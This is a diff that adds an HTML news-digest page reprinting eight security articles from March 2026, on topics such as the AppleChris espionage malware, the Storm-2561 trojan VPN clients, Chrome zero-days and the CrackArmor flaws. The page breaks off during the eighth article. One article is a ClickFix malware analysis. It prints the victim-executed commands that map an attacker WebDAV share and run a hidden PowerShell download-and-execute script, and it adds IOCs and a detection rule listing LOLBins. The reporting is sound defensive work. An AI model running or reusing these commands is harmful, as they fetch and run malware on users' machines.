@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2026-03-14 AI创业新闻</title>
+  <link rel="stylesheet" href="/hacker-news-ai-pages/assets/css/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap">
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+</head>
+<body>
+  <div class="site-container">
+    <aside class="site-sidebar">
+      
+        <nav class="nav-bar">
+  <div class="nav-logo">
+    <a href="/hacker-news-ai-pages/">🤖 <span>AI创业新闻</span></a>
+  </div>
+  
+  
+    <ul class="nav-articles">
+      <li class="nav-section-title">今日文章</li>
+      
+        <li><a href="#article-1">Chinese Hackers Target Southeast Asian Militaries with AppleChris and MemFun Malware</a></li>
+      
+        <li><a href="#article-2">Meta to Shut Down Instagram End-to-End Encrypted Chat Support Starting May 2026</a></li>
+      
+        <li><a href="#article-3">INTERPOL Dismantles 45,000 Malicious IPs, Arrests 94 in Global Cybercrime</a></li>
+      
+        <li><a href="#article-4">Storm-2561 Spreads Trojan VPN Clients via SEO Poisoning to Steal Credentials</a></li>
+      
+        <li><a href="#article-5">Investigating a New Click-Fix Variant</a></li>
+      
+        <li><a href="#article-6">Google Fixes Two Chrome Zero-Days Exploited in the Wild Affecting Skia and V8</a></li>
+      
+        <li><a href="#article-7">Nine CrackArmor Flaws in Linux AppArmor Enable Root Escalation, Bypass Container Isolation</a></li>
+      
+        <li><a href="#article-8">Authorities Disrupt SocksEscort Proxy Botnet Exploiting 369,000 IPs Across 163 Countries</a></li>
+      
+        <li><a href="#article-9">Veeam Patches 7 Critical Backup & Replication Flaws Allowing Remote Code Execution</a></li>
+      
+        <li><a href="#article-10">Rust-Based VENON Malware Targets 33 Brazilian Banks with Credential-Stealing Overlays</a></li>
+      
+        <li><a href="#article-11">Hive0163 Uses AI-Assisted Slopoly Malware for Persistent Access in Ransomware Attacks</a></li>
+      
+    </ul>
+  
+  <a href="/hacker-news-ai-pages/archives/" class="archives-btn" style="background: linear-gradient(90deg, #1dd1a1 0%, #3498db 100%); color: #fff; padding: 0.6em 1.3em; border-radius: 8px; font-weight: 600; text-decoration: none; font-size: 1.08rem; box-shadow: 0 2px 8px #1dd1a122; margin-top: 2.5rem; text-align: center; display: block;">历史归档</a>
+</nav> 
+      
+    </aside>
+    <main class="site-main">
+      <div class="archive-article-content">
+  <h1 id="2026-03-14-ai创业新闻">2026-03-14 AI创业新闻</h1>
+
+<h2 id="chinese-hackers-target-southeast-asian-militaries-with-applechris-and-memfun-malware"><a id="article-1"></a>Chinese Hackers Target Southeast Asian Militaries with AppleChris and MemFun Malware</h2>
+
+<p>A suspected China-based cyber espionage operation has targeted Southeast Asian military organizations as part of a state-sponsored campaign that dates back to at least 2020. Palo Alto Networks Unit 42 is tracking the threat activity under the moniker
+CL-STA-1087
+, where CL refers to cluster, and STA stands for state-backed motivation. “The activity demonstrated strategic operational patience and a focus on highly targeted intelligence collection, rather than bulk data theft,” security researchers Lior Rochberger and Yoav Zemah said. “The attackers behind this cluster actively searched for and collected highly specific files concerning military capabilities, organizational structures, and collaborative efforts with Western armed forces.”
+The campaign exhibits hallmarks commonly associated with advanced persistent threat (APT) operations, including carefully crafted delivery methods, defense evasion strategies, highly stable operational infrastructure, and custom payload deployment designed to support sustained unauthorized access to compromised systems.</p>
+
+<p>The tools used by the threat actor in the malicious activity include backdoors named AppleChris and MemFun, and a credential harvester called Getpass. The cybersecurity vendor said it detected the intrusion set after identifying suspicious PowerShell execution, allowing the script to enter into a sleep state for six hours and then create reverse shells to a threat actor-controlled command-and-control (C2) server. The exact initial access vector used in the attack remains unknown. The infection sequence involves the deployment of AppleChris, different versions of which are dropped across target endpoints following lateral movement to maintain persistence and evade signature-based detection.</p>
+
+<p>The threat actors have also been observed conducting searches related to official meeting records, joint military activities, and detailed assessments of operational capabilities. “The attackers showed particular interest in files related to military organizational structures and strategy, including command, control, communications, computers, and intelligence (C4I) systems,” the researchers noted. Both AppleChris variants and MemFun are designed to access a shared Pastebin account, which acts as a
+dead drop resolver
+to fetch the actual C2 address stored in Base64-decoded format. One version of AppleChris also relies on Dropbox to extract the C2 information, with the Pastebin-based approach used as a fallback option.</p>
+
+<p>The Pastebin pastes date back to September 2020. Launched via
+DLL hijacking
+, AppleChris initiates contact with the C2 server to receive commands that allow it to conduct drive enumeration, directory listing, file upload/download/deletion, process enumeration, remote shell execution, and silent process creation. The second tunneler variant represents an evolution of its predecessor, using just Pastebin to get the C2 address, in addition to introducing advanced network proxy capabilities. “To bypass automated security systems, some of the malware variants employ sandbox evasion tactics at runtime,” Unit 42 said.</p>
+
+<p>“These variants trigger delayed execution through sleep timers of 30 seconds (EXE) and 120 seconds (DLL), effectively outlasting the typical monitoring windows of automated sandboxes.”
+MemFun is launched by means of a multi-stage chain: an initial loader injects shellcode responsible for launching an in-memory downloader, whose main purpose is to retrieve C2 configuration details from Pastebin, communicate with the C2 server, and obtain a DLL that, in turn, triggers the execution of the backdoor. Since the DLL is fetched from the C2 at runtime, it gives threat actors the ability to easily deliver other payloads without having to change anything. This behavior transforms MemFun into a modular malware platform as opposed to a static backdoor like AppleChris. The execution of MemFun begins with a dropper that runs anti-forensic checks before altering its own file creation timestamp to match the creation time of the Windows System directory.</p>
+
+<p>Subsequently, it injects the main payload into the memory of a suspended process associated with “dllhost.exe” using a technique referred to as
+process hollowing
+. In doing so, the malware runs under the guise of a legitimate Windows process to fly under the radar and avoid leaving additional artifacts on disk. Also put to use in the attacks is a custom version of Mimikatz known as Getpass that escalates privileges and attempts to extract plaintext passwords, NTLM hashes and authentication data directly from the “lsass.exe” process memory. “The threat actor behind the cluster demonstrated operational patience and security awareness,” Unit 42 concluded.</p>
+
+<p>“They maintained dormant access for months while focusing on precision intelligence collection and implementing robust operational security measures to ensure campaign longevity.”
+Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="meta-to-shut-down-instagram-end-to-end-encrypted-chat-support-starting-may-2026"><a id="article-2"></a>Meta to Shut Down Instagram End-to-End Encrypted Chat Support Starting May 2026</h2>
+
+<p>Meta has announced plans to discontinue support for end-to-end encryption (E2EE) for chats on Instagram after May 8, 2026. “If you have chats that are impacted by this change, you will see instructions on how you can download any media or messages you may want to keep,” the social media giant
+said
+in a help document. “If you’re on an older version of Instagram, you may also need to update the app before you can download your affected chats.”
+The American company first began
+testing E2EE
+for
+Instagram
+direct messages
+in 2021 as part of CEO Mark Zuckerberg’s “privacy-focused vision for social networking.” The feature is currently “
+only available in some areas
+“ and is not enabled by default. Weeks into the Russo-Ukrainian war in February 2022, the company made
+encrypted direct messaging available
+to all adult users in both countries.</p>
+
+<p>The development comes days after TikTok
+said
+it does not plan to introduce E2EE to secure direct messages on the platform, telling BBC News that the technology makes users less safe and that it wants to protect users, especially young people, from harm. Late last month, Reuters also
+reported
+that Meta proceeded with plans to adopt encryption messaging services in Facebook and Instagram despite internal warnings in 2019 that doing so would hinder the company’s ability to detect illegal activities, such as child sexual abuse material (CSAM) or terrorist propaganda, and flag them to law enforcement. E2EE has been hailed as a win for privacy, as it ensures that only communicating users can decrypt and read messages, thereby locking out service providers, bad actors, and other third parties from accessing or intercepting the data. However, law enforcement and child safety advocates have argued that the technology creates a safe space for criminals, as it prevents companies from complying with warrants to turn over message content – a problem referred to as the “
+Going Dark
+“ phenomenon.</p>
+
+<p>This year, the European Commission is
+expected
+to present a Technology Roadmap on encryption to identify and evaluate solutions that enable lawful access to encrypted data by law enforcement, while safeguarding cybersecurity and fundamental rights. Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="interpol-dismantles-45000-malicious-ips-arrests-94-in-global-cybercrime"><a id="article-3"></a>INTERPOL Dismantles 45,000 Malicious IPs, Arrests 94 in Global Cybercrime</h2>
+
+<p>INTERPOL on Friday
+announced
+the takedown of 45,000 malicious IP addresses and servers used in connection with phishing, malware, and ransomware campaigns, as part of the agency’s ongoing efforts to dismantle criminal networks, disrupt emerging threats, and safeguard victims from scams. The effort is part of an international law enforcement operation that involved 72 countries and territories. It also led to the arrest of 94 people, with another 110 individuals still under investigation. A total of 212 electronic devices and servers were seized during raids at various key locations.</p>
+
+<p>One such operation in Bangladesh saw 40 suspects arrested and 134 electronic devices confiscated pertaining to a wide range of cybercrime offences, including loan and job scams, identity theft, and credit card fraud. In Togo, authorities apprehended 10 suspects accused of running a fraud ring from a residential area. While some were involved in hacking into social media accounts, others conducted social engineering schemes, including romance scams and sextortion. The fraudsters, after gaining unauthorized access to a victim’s account, reached out to their online contacts, impersonating the account holder to engage in fake romantic relationships and deceive friends and family members.</p>
+
+<p>The ultimate objective of the scam was to trick the secondary victims into making money transfers. Lastly, Macau law enforcement officials identified more than 33,000 phishing and fraudulent websites related to fake casinos and critical infrastructure, such as banks, governments, and payment services. These websites were set up to defraud victims by instructing them to top up their balances or enter personal information. The cybercrime crackdown marks the third phase of Operation Synergia, which took place between July 18, 2025, and January 31, 2026.</p>
+
+<p>The previous two phases took place in
+2023
+and
+2024
+, identifying thousands of malicious servers and scores of arrests. India’s CBI Targets Transnational Fraud Case
+The disclosure comes as India’s Central Bureau of Investigation (CBI) said it conducted coordinated searches at 15 locations across Delhi, Rajasthan, Uttar Pradesh, and Punjab as part of a large-scale organized online investment and part-time job fraud primarily involving a Dubai-based fintech platform called Pyypl. “It was alleged that thousands of unsuspecting Indian citizens were cheated of crores of rupees through deceptive online schemes operated by an organized transnational fraud syndicate,” the CBI
+said
+. The criminal network is said to have leveraged social media platforms, mobile applications, and encrypted messaging services to lure victims with promises of high returns from online investments and part-time job opportunities.</p>
+
+<p>As
+highlighted
+by Proofpoint in October 2024, these scams aim to gain victims’ trust by convincing them to deposit small amounts and show fictitious profits on fake sites, after which they are persuaded to invest larger sums of money. As soon as the funds are deposited, they are quickly transferred through multiple mule bank accounts to cover up the money trail and then cashed out through offshore ATM withdrawals using debit cards enabled for international transactions and via wallet top-ups on overseas fintech platforms like Pyypl using Visa and Mastercard payment networks. These withdrawals, per the CBI, appeared as point-of-sale (PoS) transactions in banking systems to fly under the radar. Some of the stolen money has also been converted to cryptocurrency, and consolidated into accounts linked to 15 shell companies and routed through two entities.</p>
+
+<p>“These entities converted the proceeds into USDT through India-based virtual asset exchanges and transferred the cryptocurrency to their white-listed wallets,” the CBI added. The crime investigating agency has identified Ashok Kumar Sharma and other unnamed co-conspirators as key members of the syndicate. Sharma has been taken into custody. It also said various bank accounts used by the entities have been frozen, and incriminating documents and digital evidence related to the syndicate’s day-to-day operations have been seized.</p>
+
+<p>Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="storm-2561-spreads-trojan-vpn-clients-via-seo-poisoning-to-steal-credentials"><a id="article-4"></a>Storm-2561 Spreads Trojan VPN Clients via SEO Poisoning to Steal Credentials</h2>
+
+<p>Microsoft has disclosed details of a credential theft campaign that employs fake virtual private network (VPN) clients distributed through search engine optimization (SEO) poisoning techniques. “The campaign redirects users searching for legitimate enterprise software to malicious ZIP files on attacker-controlled websites to deploy digitally signed trojans that masquerade as trusted VPN clients while harvesting VPN credentials,” the Microsoft Threat Intelligence and Microsoft Defender Experts teams
+said
+. The Windows maker, which observed the activity in mid-January 2026, has attributed it to
+Storm-2561
+, a threat activity cluster known for propagating malware through SEO poisoning and impersonating popular software vendors since May 2025. The threat actor’s campaigns were
+first documented
+by Cyjax, highlighting the use of SEO poisoning to redirect users searching for software programs from companies like SonicWall, Hanwha Vision, and Pulse Secure (now Ivanti Secure Access) on Bing to fake sites and trick them into downloading MSI installers that deploy the
+Bumblebee loader
+.</p>
+
+<p>A subsequent iteration of the attack was
+disclosed
+by Zscaler in October 2025. The campaign was observed taking advantage of users searching for legitimate software on Bing to propagate a trojanized Ivanti Pulse Secure VPN client via bogus websites (“ivanti-vpn[.]org”) that ultimately stole VPN credentials from the victim’s machine. Microsoft said the activity highlights how threat actors exploit trust in search engine rankings and software branding as a social engineering tactic to steal data from users looking for enterprise VPN software. Compounding matters is the abuse of trusted platforms like GitHub to host the installer files.</p>
+
+<p>Specifically, the GitHub repository hosts a ZIP file containing an MSI installer file that masquerades as legitimate VPN software, but sideloads malicious DLL files during installation. The end goal, as before, is to collect and exfiltrate VPN credentials using a variant of an information stealer called Hyrax. A fake, yet convincing, VPN sign-in dialog is displayed to the user to capture the credentials. Once the information is entered by the victim, they are displayed an error message and are instructed to download the legitimate VPN client this time.</p>
+
+<p>In some cases, they are redirected to the legitimate VPN website. The malware makes use of the
+Windows RunOnce registry key
+to set up persistence, so that it’s executed automatically every time following a system reboot. “This campaign exhibits characteristics consistent with financially motivated cybercrime operations employed by Storm-2561,” Microsoft said. “The malicious components are digitally signed by ‘Taiyuan Lihua Near Information Technology Co., Ltd.’”
+The tech giant has since taken down the attacker-controlled GitHub repositories and revoked the legitimate certificate to neutralize the operation.</p>
+
+<p>To counter such threats, organizations and users are advised to implement multi-factor authentication (MFA) on all accounts, exercise caution when downloading software from websites, and make sure that they are authentic. Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="investigating-a-new-click-fix-variant"><a id="article-5"></a>Investigating a New Click-Fix Variant</h2>
+
+<dl>
+  <dt>Disclaimer</dt>
+  <dd>This report has been prepared by the Threat Research Center to enhance cybersecurity awareness and support the strengthening of defense capabilities. It is based on independent research and observations of the current threat landscape available at the time of publication. The content is intended for informational and preparedness purposes only. Read more blogs around threat intelligence and adversary research:
+https://atos.net/en/lp/cybershield
+Summary
+Atos Researchers identified a new variant of the popular ClickFix technique, where attackers convince the user to execute a malicious command on their own device through the Win + R shortcut.</dd>
+</dl>
+
+<p>In this variation, a “net use” command is used to map a network drive from an external server, after which a “.cmd” batch file hosted on that drive is executed. Script downloads a ZIP archive, unpacks it, and executes the legitimate WorkFlowy application with modified, malicious logic hidden inside “.asar” archive. This acts as a C2 beacon and a dropper for the final malware payload. Figure 1: High-level overview of attack flow.</p>
+
+<p>Attack overview
+In this version, the initial vector of attack is the same as in all the other ones, a web page posing as a captcha mechanism – “happyglamper[.]ro”. It prompts the user to open the Run application via “Win+R”, followed by “Ctrl+V” and “Enter”
+Figure 2: Phishing website 1
+Figure 3: Phishing website 2
+This executes the following command:
+“cmd.exe” /c net use Z: http://94.156.170[.]255/webdav /persistent:no &amp;&amp; “Z:\update.cmd” &amp; net use Z: /delete
+Typically, at this stage, attackers have used PowerShell or mshta to download and execute the next stage of the malware. Here, instead, we can see that “net use” is being used to map and connect to a network drive of an external server from which a Batch script is executed. While not novel, these TTPs were never seen in ClickFix attacks before.</p>
+
+<p>Combined with the next uncommon stages of infection patterns, this campaign gives Adversaries high chances to evade defensive controls and stay under the radar of defenders. In this case, the observed ClickFix variant of execution flow successfully bypassed the detection of Microsoft Defender for Endpoint. Atos security teams were able to detect it only thanks to the internal Threat Hunting service focusing on the main behavioral aspect of the ClickFix technique – initial execution through the RunMRU registry key (
+hunting query available in the Appendix section
+). The initial execution script “update.cmd” is loaded from the mapped drive and executed; after that, the mapped drive is removed.</p>
+
+<p>Content of “update.cmd”:
+start “” /min powershell -WindowStyle Hidden -Command “Invoke-WebRequest ‘http://94.156.170[.]255/flowy.zip’ -OutFile "$env:TEMP\dl.zip";
+Expand-Archive "$env:TEMP\dl.zip" -DestinationPath "$env:LOCALAPPDATA\MyApp" -Force;
+Start-Process "$env:LOCALAPPDATA\MyApp\WorkFlowy.exe"”
+This spawns a PowerShell instance which downloads a zip archive and extracts it into “%LOCALAPPDATA%\MyApp\” directory. Then it executes “WorkFlowy.exe” binary. Figure 4: Content of flowy.zip archive
+WorkFlowy analysis
+The archive contains a WorkFlowy desktop application (version 1.4.1050), signed by the developer “FunRoutine Inc.”, distributed as an Electron application bundle. Electron applications are written using popular web technologies – HTML, CSS, and JavaScript – and use “.asar” archives to pack source code during application packing.</p>
+
+<p>It is done for various reasons, like mitigating issues around long path names on Windows. The malicious code was injected into main.js, the Node.js entry point of the app, hidden inside the app.asar archive. Technical Profile
+Property
+Value
+Target application
+WorkFlowy Desktop (Electron)
+Malicious version
+1.4.1050
+Malicious file
+resources/app.asar → /main.js
+C2 domain
+cloudflare.report/forever/e/
+C2 origin IP
+144[.]31[.]165[.]173 (Frankfurt, AS215439 play2go.cloud)
+Domain registered
+January 2026, HK registrant, OnlineNIC registrar
+Victim ID file
+%APPDATA%\id.txt
+Dropper staging dir
+%TEMP%[unix_timestamp]<br />
+Infection Vector
+The malicious ASAR archive is a direct replacement for the legitimate resources/app.asar. The attacker repackaged an older version of the app (v1.4 vs.</p>
+
+<p>the current v4.3) with injected code. Figure 5: Content of “resources” subdirectory
+Malicious Code (Dropper/Beacon)
+When WorkFlowy is executed, it looks for app.asar file in the relative path hardcoded into the binary. It then reads the main.js file from inside of it, decodes it to a string, and parses it to the embedded V8 Google JavaScript engine, which executes it. Attackers have replaced the legitimate main.js with one they have created themselves.</p>
+
+<p>Instead of well-structured scripts, they have used heavily obfuscated on-liner structure, adding malicious code on top of legitimate one, ensuring it is executed first and blocking WorkFlowy functionality. Malicious code contains several critical functions:
+Malware executes before the legitimate application starts:
+The injected IIFE opens with await f() — the infinite C2 beacon loop. Because f() never resolves, all legitimate WorkFlowy initialization code that follows is permanently blocked. The malware runs with full Node.js privileges immediately on launch.</p>
+
+<p>Persistent victim fingerprinting via %APPDATA%\id.txt:
+A random 8-character alphanumeric ID is generated on first run and written to %APPDATA%\id.txt. On subsequent runs, the stored ID is read back, giving the attacker a stable identifier for each victim machine across sessions. C2 beacon — exfiltrates host identity every 2 seconds:
+Function u() sends an HTTP POST containing the victim’s unique ID, machine name, and Windows username to the C2 server. The loop in f() repeats this indefinitely with a 2-second interval.</p>
+
+<p>Remote payload download and execution:
+Function p() receives a task object from the C2, decodes base64-encoded file contents, writes them to a timestamped directory under %TEMP%, and executes any .exe via child_process.exec. If the C2 connection is not established, no files or directories are generated. At the time of this analysis, the C2 domain was already unresponsive. Why Electron is an Effective Delivery mechanism
+The malicious code runs in the Node.js main process - outside the Chromium sandbox - with the full privileges of the logged-in user, allowing for the malicious code to execute any actions the user is allowed to do on the system.</p>
+
+<p>No files are actually written to disk, and since the malicious payload is packed inside “.asar” archive, it additionally helps to hide malicious code. Persistence
+No OS-level persistence is implemented via the dropper. The beacon runs only while WorkFlowy is open. The only artifact written to disk before next stage delivery is %APPDATA%\id.txt (victim tracking ID), and that is only if the connection to C2 is established correctly.</p>
+
+<p>Presumably, an OS-level persistence is delegated to whatever payload the C2 delivers via the dropper. Read more blogs around threat intelligence and adversary research:
+https://atos.net/en/lp/cybershield
+Key takeaways
+This ClickFix variant is significant because it moves initial access away from commonly abused scripting and execution engines such as PowerShell, MSHTA, and WScript, and instead relies on net use to abuse WebDAV as a delivery mechanism. Previous ClickFix campaigns typically exposed themselves by directly invoking interpreters or living‑off‑the‑land binaries that are heavily monitored by modern EDR solutions. In contrast, this iteration mounts a remote WebDAV share as a local drive, executes a hosted batch file through standard filesystem semantics, and removes the mapping immediately after use.</p>
+
+<p>This shows that ClickFix still evolves, expanding its arsenal of proxy execution methods and starting to utilize native networking utilities. The malicious logic is hidden by replacing the content of the Workflowy application’s app.asar archive with a trojanized version of main.js. Because the code runs inside the Electron main process and remains packaged within a legitimate application, it avoids many file‑based and behavioral detections that focus on standalone loaders or script interpreters. ASAR archives are rarely inspected, allowing the dropper logic to execute through normal application startup with minimal visibility.</p>
+
+<p>This activity was not detected by security controls and was only identified through targeted threat hunting at Atos. Detection relied on analyzing execution context rather than payload indicators, specifically hunting for suspicious command execution originating from the Explorer Run dialog (recorded inside the RunMRU Registry Key). This underscores the growing importance of threat hunting as a complementary detection mechanism: as ClickFix campaigns shift toward native utilities and trusted applications that generate few alerts, only proactive, hypothesis-driven hunting can help surface these weak signals early enough to disrupt the attack chain. Appendixes
+IOCs
+Domain
+cloudflare[.]report
+Domain
+happyglamper[.]ro
+IP
+94[.]156[.]170[.]255
+IP
+144[.]31[.]165[.]173
+URL
+https://cloudflare[.]report/forever/e/
+File
+%APPDATA%\id.txt
+Path
+%TEMP%[13-digit-timestamp]<br />
+SHA256
+a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063 (app.asar)
+SHA256
+9ee58eb59e337c06429ff3f0afd0ee6886b0644ddd4531305b269e97ad2b8d42 (WorkFlowy.exe – Older version of legitimate binary, not malicious)
+SHA256
+dc95f7c7fb98ec30d3cb03963865a11d1b7b696e34f163b8de45f828b62ec829 (main.js)
+Hunting Query
+title: Suspicious Commands executed via Run dialog
+id: 20891a30-032e-4f15-a282-fa4a8b0d8aae
+status: experimental
+description:
+Detects suspicious command interpreters and LOLBins written into the Explorer RunMRU registry key (commonly used for Run dialog history), with explorer.exe as the initiating process.</p>
+
+<p>author: TRC
+date: 2026-03-05
+tags:</p>
+<ul>
+  <li>attack.execution</li>
+  <li>attack.t1059</li>
+  <li>attack.defense_evasion
+logsource:
+category: registry_set
+product: windows
+definition: “Sysmon Event ID 13 (Registry value set) or equivalent EDR registry telemetry”
+detection:
+selection_key:
+TargetObject|contains: ‘\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’
+selection_proc:
+Image|endswith: ‘\explorer.exe’
+selection_data:
+Details|contains:</li>
+  <li>‘cmd ‘</li>
+  <li>‘powershell ‘</li>
+  <li>‘cmd.exe ‘</li>
+  <li>‘powershell.exe ‘</li>
+  <li>‘wscript.exe ‘</li>
+  <li>‘cscript.exe ‘</li>
+  <li>‘net.exe ‘</li>
+  <li>‘net1.exe ‘</li>
+  <li>‘sh.exe ‘</li>
+  <li>‘bash.exe ‘</li>
+  <li>‘schtasks.exe ‘</li>
+  <li>‘regsvr32.exe ‘</li>
+  <li>‘hh.exe ‘</li>
+  <li>‘wmic.exe ‘</li>
+  <li>‘mshta.exe ‘</li>
+  <li>‘rundll32.exe ‘</li>
+  <li>‘msiexec.exe ‘</li>
+  <li>‘forfiles.exe ‘</li>
+  <li>‘scriptrunner.exe ‘</li>
+  <li>‘mftrace.exe ‘</li>
+  <li>‘AppVLP.exe ‘</li>
+  <li>‘svchost.exe ‘</li>
+  <li>‘msbuild.exe ‘
+condition: selection_key and selection_proc and selection_data
+falsepositives:</li>
+  <li>“Legitimate administrative activity using Run dialog (Win+R) to execute built-in tools.”</li>
+  <li>“IT scripts or troubleshooting steps executed interactively by a user.”
+level: medium
+Read more blogs around threat intelligence and adversary research:
+https://atos.net/en/lp/cybershield
+Found this article interesting? This article is a contributed piece from one of our valued partners. Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</li>
+</ul>
+
+<h2 id="google-fixes-two-chrome-zero-days-exploited-in-the-wild-affecting-skia-and-v8"><a id="article-6"></a>Google Fixes Two Chrome Zero-Days Exploited in the Wild Affecting Skia and V8</h2>
+
+<p>Google on Thursday released security updates for its Chrome web browser to address two high-severity vulnerabilities that it said have been exploited in the wild. The list of vulnerabilities is as follows -
+CVE-2026-3909
+(CVSS score: 8.8) - An out-of-bounds write vulnerability in the Skia 2D graphics library that allows a remote attacker to perform out-of-bounds memory access via a crafted HTML page. CVE-2026-3910
+(CVSS score: 8.8) - An inappropriate implementation vulnerability in the V8 JavaScript and WebAssembly engine that allows a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page. Both vulnerabilities were discovered and reported by Google itself on March 10, 2026.</p>
+
+<p>As is customary in these cases, no details are available about how the issues are being abused in the wild and who is behind the efforts. This is done so as to prevent other threat actors from exploiting the issues. “Google is aware that exploits for both CVE-2026-3909 and CVE-2026-3910 exist in the wild,” the company
+noted
+. The development comes less than a month after Google shipped fixes for a high-severity use-after-free bug in Chrome’s CSS component (
+CVE-2026-2441
+, CVSS score: 8.8) that had also been exploited as a zero-day.</p>
+
+<p>Google has patched a total of three actively weaponized Chrome zero-days since the start of the year. For optimal protection, users are advised to update their Chrome browser to versions 146.0.7680.75/76 for Windows and Apple macOS, and 146.0.7680.75 for Linux. To make sure the latest updates are installed, users can navigate to More &gt; Help &gt; About Google Chrome and select Relaunch. Users of other Chromium-based browsers, such as Microsoft Edge, Brave, Opera, and Vivaldi, are also advised to apply the fixes as and when they become available.</p>
+
+<p>Update
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on March 13, 2026,
+added
+both the Google Chrome vulnerabilities to its Known Exploited Vulnerabilities (
+KEV
+) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by March 27, 2026. Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="nine-crackarmor-flaws-in-linux-apparmor-enable-root-escalation-bypass-container-isolation"><a id="article-7"></a>Nine CrackArmor Flaws in Linux AppArmor Enable Root Escalation, Bypass Container Isolation</h2>
+
+<p>Cybersecurity researchers have disclosed multiple security vulnerabilities within the Linux kernel’s
+AppArmor
+module that could be exploited by unprivileged users to circumvent kernel protections, escalate to root, and undermine container isolation guarantees. The nine confused deputy vulnerabilities have been collectively codenamed
+CrackArmor
+by the Qualys Threat Research Unit (TRU). The cybersecurity company said the issue has existed since 2017. No CVE identifiers have been assigned to the shortcomings.</p>
+
+<p>AppArmor is a Linux security module that provides mandatory access control (MAC) and secures the operating system against external or internal threats by preventing known and unknown application flaws from being exploited. It has been included in the mainline Linux kernel since version 2.6.36. “This ‘CrackArmor’ advisory exposes a
+confused deputy flaw
+allowing unprivileged users to manipulate security profiles via pseudo-files, bypass user-namespace restrictions, and execute arbitrary code within the kernel,” Saeed Abbasi, senior manager of Qualys TRU,
+said
+. “These flaws facilitate local privilege escalation to root through complex interactions with tools like Sudo and Postfix, alongside denial-of-service attacks via stack exhaustion and Kernel Address Space Layout Randomization (KASLR) bypasses via out-of-bounds reads.”
+Confused deputy vulnerabilities
+occur when a privileged program is coerced by an unauthorized user into misusing its privileges to perform unintended, malicious actions.</p>
+
+<p>The problem essentially exploits the trust associated with a more-privileged tool to execute a command that leads to privilege escalation. Qualys said an entity that doesn’t have permissions to perform an action can manipulate AppArmor profiles to disable critical service protections or enforce deny-all policies, triggering denial-of-service (DoS) attacks in the process. “Combined with kernel-level flaws inherent in profile parsing, attackers bypass user-namespace restrictions and achieve Local Privilege Escalation (LPE) to full root,” it added. “Policy manipulation compromises the entire host, while namespace bypasses facilitate advanced kernel exploits such as arbitrary memory disclosure.</p>
+
+<p>DoS and LPE capabilities result in service outages, credential tampering via passwordless root (e.g., /etc/passwd modification), or KASLR disclosure, which enables further remote exploitation chains.”
+To make matters worse, CrackArmor enables unprivileged users to create fully‑capable user namespaces, effectively getting around Ubuntu’s
+user namespace restrictions
+implemented via AppArmor, as well as subvert critical security guarantees like container isolation, least‑privilege enforcement, and service hardening. The cybersecurity company said it’s withholding the release of proof-of-concept (PoC) exploits for the identified flaws to give users some time to prioritize patches and minimize exposure. The problem affects all Linux kernels since version 4.11 on any distribution that integrates AppArmor. With more than 12.6 million enterprise Linux instances operating with AppArmor enabled by default in several major distributions, such as Ubuntu, Debian, and SUSE, immediate kernel patching is advised to mitigate these vulnerabilities.</p>
+
+<p>“Immediate kernel patching remains the non-negotiable priority for neutralizing these critical vulnerabilities, as interim mitigation does not offer the same level of security assurance as restoring the vendor-fixed code path,” Abbasi noted. Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="authorities-disrupt-socksescort-proxy-botnet-exploiting-369000-ips-across-163-countries"><a id="article-8"></a>Authorities Disrupt SocksEscort Proxy Botnet Exploiting 369,000 IPs Across 163 Countries</h2>
+
+<p>A court-authorized international law enforcement operation has dismantled a criminal proxy service named
+SocksEscort
+that enslaved thousands of residential routers worldwide into a botnet for committing large-scale fraud. “SocksEscort infected home and small business internet routers with malware,” the U.S. Department of Justice (DoJ)
+said
+. “The malware allowed SocksEscort to direct internet traffic through the infected routers.</p>
+
+<p>SocksEscort sold this access to its customers.”
+SocksEscort (“socksescort[.]com”) is said to have offered to sell access to about 369,000 different IP addresses in 163 countries since the summer of 2020, with the service listing nearly 8,000 infected routers as of February 2026. Of these, 2,500 were located in the U.S. As of December 2025, SocksEscort’s website claimed to offer “static residential IPs with unlimited bandwidth” and that they can bypass spam blocklists. It advertised over 35,900 proxies from 102 countries, with a set of 30 proxies costing $15 per month.</p>
+
+<p>A package consisting of 5,000 proxies cost $200 a month. The end goal of services like SocksEscort is to enable paying customers to tunnel internet traffic through compromised devices without the victim’s knowledge, offering them a way to blend in and make it harder to differentiate malicious traffic from legitimate activity by concealing their true IP addresses and locations. Some of the victims who were defrauded as part of schemes carried out using SocksEscort included a customer of a cryptocurrency exchange who lived in New York and was defrauded of $1 million worth of cryptocurrency; a manufacturing business in Pennsylvania that was defrauded of $700,000; and current and former U.S. service members with MILITARY STAR cards who were defrauded out of $100,000.</p>
+
+<p>In a coordinated announcement, Europol said the effort, codenamed Operation Lightning, involved authorities from Austria, Bulgaria, France, Germany, Hungary, the Netherlands, Romania, and the U.S. The disruption exercise has resulted in the takedown of 34 domains and 23 servers located in seven countries. A total of $3.5 million in cryptocurrency has been frozen. “These devices, primarily residential routers, were exploited to facilitate various criminal activities, including ransomware, DDoS attacks, and the distribution of child sexual abuse material (CSAM),” Europol
+said
+.</p>
+
+<p>“The compromised devices were infected through a vulnerability in the residential modems of a specific brand.”
